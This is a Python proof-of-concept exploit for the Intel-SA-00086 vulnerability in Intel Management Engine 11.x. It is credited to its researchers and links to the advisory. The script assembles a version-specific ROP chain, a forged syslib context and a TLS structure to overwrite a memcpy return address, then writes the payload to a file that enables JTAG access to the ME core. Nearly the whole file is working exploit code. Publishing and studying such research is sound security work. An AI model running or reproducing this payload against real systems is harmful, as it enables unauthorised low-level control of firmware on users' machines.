#!/usr/bin/env python
# JTAG activator for Intel ME core via Intel-SA-00086 by  Mark Ermolov (@_markel___)
#                                                         Maxim Goryachy (@h0t_max)
# Port to ME 11.x by Youness Alaoui (@KaKaRoToKS)
#
# Details:  https://www.intel.com/content/www/us/en/security-center/advisory/intel-sa-00086.html
#           http://blog.ptsecurity.com/2018/01/running-unsigned-code-in-intel-me.html
#           https://github.com/ptresearch/IntelME-JTAG

from __future__ import print_function
import argparse
import struct

descr = "Intel-SA-00086 JTAG-PoC for ME 11.x"

class MeInfo:
    def __init__(self, version, bup_base, bup_uncompressed_size, bup_stack_size,
                 ct_data_offset, memcpy_ret_offset, syslib_addr, syslib_size,
                 pop_esp_addr, rop_function, num_shmem_desc=16):
        self.ME_VERSION = version
        self.STACK_BASE = bup_base + bup_uncompressed_size + bup_stack_size + 0x1000
        self.BUFFER_OFFSET = ct_data_offset
        self.SYSLIB_ADDRESS = syslib_addr
        self.SYSLIB_SIZE = syslib_size
        self.TARGET_ADDRESS = self.STACK_BASE - memcpy_ret_offset
        self.POP_ESP_ADDRESS = pop_esp_addr
        self.BUP_THREAD_ID = 0x03000300
        self.NUM_SHMEM_DESC = num_shmem_desc
        self.ROP_ADDRESS = self.STACK_BASE - self.BUFFER_OFFSET
        if rop_function:
            self.ROPS = rop_function(self)

def rop(addr):
    return struct.pack("<L", addr)

# Return current stack address with an offset above the stack
# useful to build rop independent ebp
def rop_address(me_info, rops, skip=0):
    return rop(me_info.ROP_ADDRESS + len(rops) + (skip * 4))

def GenerateRops(me_info):
    if me_info.ME_VERSION == "11.0.18.1002":
        (write_selector, dfx_agg_sel, infinite_loop) = (0x11B9, 0x10F, 0x44EA3)
        (pop_6, write_edx_and_pop_3, pop_3) = (0x99D6, 0x13819, 0x1381B)
        (scripts_second_array, init_tracehub_array_idx) = (0x55C44, 3)
        (retaddr_init_tracehub, retaddr_run_scripts, retaddr_bup_main) = (0x34113, 0x32C51, 0x2D0A1)
    elif me_info.ME_VERSION == "11.6.0.1126":
        (write_selector, dfx_agg_sel, infinite_loop) = (0x11B9, 0x1A7, 0xbd85)
        (pop_6, write_edx_and_pop_3, pop_3) = (0xe9d0, 0xD1BF, 0xD1C1)
        (scripts_second_array, init_tracehub_array_idx) = (0x5AB88, 3)
        (retaddr_init_tracehub, retaddr_run_scripts, retaddr_bup_main) = (0x381D4, 0x36CBC, 0x310A1)
    else:
        raise Exception("Unsupported ME version")
        
    rops = ""

    # Write dfx personality = 0x3
    rops += rop(write_selector)				# write_sideband_port
    rops += rop(pop_3)					# pop esi; pop edi; pop ebp; ret
    rops += rop(dfx_agg_sel)				# param 1 - selector
    rops += rop(0)					# param 2 - offset
    rops += rop(0x3)					# param 3 - value
    
    # Set edx and ecx in preparation for the mem write and set edi for later
    rops += rop(pop_6)					# pop edx; pop ecx; pop ebx; pop esi; pop edi; pop ebp; ret
    rops += rop(me_info.STACK_BASE - 0x10)		# syslib pointer in TLS (edx)
    rops += rop(me_info.SYSLIB_ADDRESS)			# syslib address (ecx)
    rops += rop(0)*2					# Unused (ebx, esi)
    rops += rop(scripts_second_array)			# second array address (edi)
    rops += rop(0)					# Unused (ebp)

    # Write ecx value into address pointed by edx
    # We also restore the ebx, esi, and ebp registers for the bup_run_scripts function (edi is set in previous ROP gadget)
    rops += rop(write_edx_and_pop_3)			# mov [edx], ecx; pop ebx; pop esi; pop ebp; ret
    rops += rop(0)					# script index (ebx)
    rops += rop(init_tracehub_array_idx)		# second array index (esi)
    rops += rop_address(me_info, rops, 6)		# set EBP to 6 DWORDs above in the stack
        
    # Return to bup_run_init_scripts
    rops += rop(retaddr_init_tracehub)			# continue bup initialization after call to bup_init_trace_hub
    rops += rop(0)*4					# 4 registers pushed into the stack by bup_run_init_scripts (edi, esi, ebx,var_10)
    rops += rop_address(me_info, rops, 3)		# set EBP to 3 DWORDs above in the stack

    # Return to bup_main
    rops += rop(retaddr_run_scripts)			# continue initialization after call to bup_run_init_scripts
    rops += rop(0)					# value pushed into the stack
    rops += rop(0)					# Irrelevant EBP value

    # Return to bup_entry
    rops += rop(retaddr_bup_main)			# continue initialization after call to bup_main
        
    return rops


ME_INFOS = [
    MeInfo("11.0.18.1002", 0x2D000, 0x30000, 0x2000, 0x380, 0x988,
           0x82CAC, 0x218, 0xEA64, GenerateRops, num_shmem_desc=6),
    MeInfo("11.6.0.1126", 0x31000, 0x2F000, 0x2000, 0x380, 0x974,
           0x862F4, 0x220, 0x1436F, GenerateRops),
    # Incomplete
    MeInfo("11.0.0.1122_COR_LP_B0_BYP_RGN", 0x24000, 0x2D000, 0x2000, 0x384, 0x984,
           0x77768, 0x201, 0, None),
    MeInfo("11.0.0.1180", 0x2D000, 0x2D000, 0x2000, 0x384, 0x984,
           0x7F86C, 0x218, 0xED74, None), # 0xB7, 0x3F692, 0x144F4,
]


def GenerateSyslibCtx(me_info, syslib_ctx_addr):
    shmem_descs = ""
    for i in range(me_info.NUM_SHMEM_DESC):
        shmem_descs += struct.pack("<LLLLL", 0x1, me_info.TARGET_ADDRESS - me_info.BUFFER_OFFSET,
                                   me_info.BUFFER_OFFSET + 0x40, 0, 0)
    
    syslib_ctx_addr -= 0x90
    syslib_ctx = struct.pack("<LL", syslib_ctx_addr + 0x98, me_info.NUM_SHMEM_DESC)
    syslib_ctx += shmem_descs
    return (syslib_ctx, syslib_ctx_addr)
        
# ROPS
# syslib_ctx < shared mem ptr > pointing to valid descriptors below
# shared mem descriptors with address of memcpy_s ret address
# up to 0x380 with syslib context pointing up
# chunk with pointers to ROP address

def GenerateShellCode(version):
    me_info = None
    for info in ME_INFOS:
        if info.ME_VERSION == version:
            me_info = info
            break
    if me_info is None:
        supported_versions = map(lambda info: info.ME_VERSION, ME_INFOS)
        print("Cannot find required information for the specified version.")
        print("Supported versions : '%s'" % "' -- '".join(supported_versions))
        return None
    
    print("[*] Generating Shell code(Stack: 0x%X, Buffer offset: 0x%X, Target : 0x%X)..." %
          (me_info.STACK_BASE, me_info.BUFFER_OFFSET, me_info.TARGET_ADDRESS))
    # Add ROPs
    data = me_info.ROPS

    # Create syslib context and add it to the data
    syslib_ctx_addr = me_info.ROP_ADDRESS + len(data)
    (syslib_ctx, syslib_ctx_addr) = GenerateSyslibCtx(me_info, syslib_ctx_addr)
    data += syslib_ctx

    # Create TLS structure
    tls = struct.pack("<LLLLL", 0, syslib_ctx_addr, 0, me_info.BUP_THREAD_ID, me_info.STACK_BASE-4)
    if len(data) + len(tls) > me_info.BUFFER_OFFSET:
        print("Too much data in the ROPs, cannot fit payload within 0x%X bytes" % me_info.BUFFER_OFFSET)
        return None

    # Add padding and add TLS at the end of the buffer
    data += struct.pack("<B", 0x0)*(me_info.BUFFER_OFFSET - len(data) - len(tls))
    data += tls
    
    # Could put ROPs here, but if it's more than one chunk, we wouldn't be able to get the full content.
    # So we just put a 'pop esp' with the ROP address into our chunk (bootstarting ROP).
    data += struct.pack("<LL", me_info.POP_ESP_ADDRESS, me_info.ROP_ADDRESS)*8
    return data

def ParseArguments():
    parser = argparse.ArgumentParser(description=descr)
    parser.add_argument('-f', metavar='<file name>', help='file name', type=str, default="ct")
    parser.add_argument('-v', metavar='<ME version>', help='ME version', type=str, default="11.6.0.1126")
    return parser.parse_args()

def main():
    print(descr)
    args = ParseArguments()
    data = GenerateShellCode(args.v)
    if data:
        print("[*] Saving to %s..." % (args.f))
        f = open(args.f, "wb")
        f.write(data)
        f.close
    
if __name__=="__main__":
    main()
